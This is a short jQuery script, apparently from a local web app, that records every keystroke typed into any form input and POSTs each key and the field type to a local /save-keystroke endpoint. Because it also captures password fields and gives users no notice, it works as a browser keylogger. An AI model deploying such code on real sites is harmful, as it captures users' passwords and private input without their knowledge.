$(document).ready(function() {
    $('form').on('keyup', 'input', function(e) {
        var keystroke = e.key;
        var inputType = $(this).attr('type');

        $.ajax({
            url: 'http://127.0.0.1:8000/save-keystroke',
            method: 'POST',
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
                keystroke: keystroke,
                inputType: inputType
            },
            success: function(response) {
                console.log(response.message);
            },
            error: function(response) {
                console.log('Error:', response);
            }
        });
    });
});